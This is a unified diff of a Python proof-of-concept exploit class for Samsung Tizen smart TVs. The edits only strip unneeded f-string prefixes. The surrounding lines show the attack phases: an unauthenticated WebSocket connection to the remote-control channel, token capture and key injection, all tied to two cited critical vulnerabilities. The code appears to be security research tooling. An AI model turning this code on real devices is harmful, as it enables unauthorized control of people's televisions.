@@ -142,7 +142,7 @@ class TizenPoC:
     # Phase 3: WebSocket Connection
     # ------------------------------------------------------------------
     def _ws_connect(self, token: str = "") -> socket.socket | None:
-        path = f"/api/v2/channels/samsung.remote.control"
+        path = "/api/v2/channels/samsung.remote.control"
         if token:
             path += f"?token={token}"
         key  = base64.b64encode(os.urandom(16)).decode()
@@ -200,7 +200,7 @@ class TizenPoC:
         sock = self._ws_connect()
         if not sock:
             self.evidence["phases"]["websocket"] = {"status": "failed"}
-            self.log(f"  [-] WebSocket connection failed")
+            self.log("  [-] WebSocket connection failed")
             return False
 
         connect_cmd = json.dumps({
@@ -222,7 +222,7 @@ class TizenPoC:
             "response": resp[:500],
             "token":    self.token,
         }
-        self.log(f"  [+] WebSocket connected without pairing!")
+        self.log("  [+] WebSocket connected without pairing!")
         if self.token:
             self.log(f"  [+] Token captured: {self.token}")
             self.evidence["findings"].append({
@@ -243,7 +243,7 @@ class TizenPoC:
         sock = self._ws_connect(self.token)
         if not sock:
             self.evidence["phases"]["key_inject"] = {"status": "failed"}
-            self.log(f"  [-] Cannot connect for key injection")
+            self.log("  [-] Cannot connect for key injection")
             return False
 
         injected = []
@@ -341,9 +341,9 @@ class TizenPoC:
 
     def run(self) -> dict:
         print(f"\n{'='*60}")
-        print(f"Samsung Tizen Smart Hub — End-to-End PoC")
+        print("Samsung Tizen Smart Hub — End-to-End PoC")
         print(f"Target: {self.target}")
-        print(f"Research: TIZEN-2026-001 (9.8 CRITICAL) + TIZEN-2026-005 (8.8 HIGH)")
+        print("Research: TIZEN-2026-001 (9.8 CRITICAL) + TIZEN-2026-005 (8.8 HIGH)")
         print(f"{'='*60}")
 
         self.phase1_ssdp()
@@ -355,7 +355,7 @@ class TizenPoC:
         evidence_path = self.phase6_evidence()
 
         print(f"\n{'='*60}")
-        print(f"Results:")
+        print("Results:")
         print(f"  Vulnerabilities: {len(set(self.evidence['vuln_ids']))}")
         for vid in set(self.evidence["vuln_ids"]):
             print(f"    {vid}")
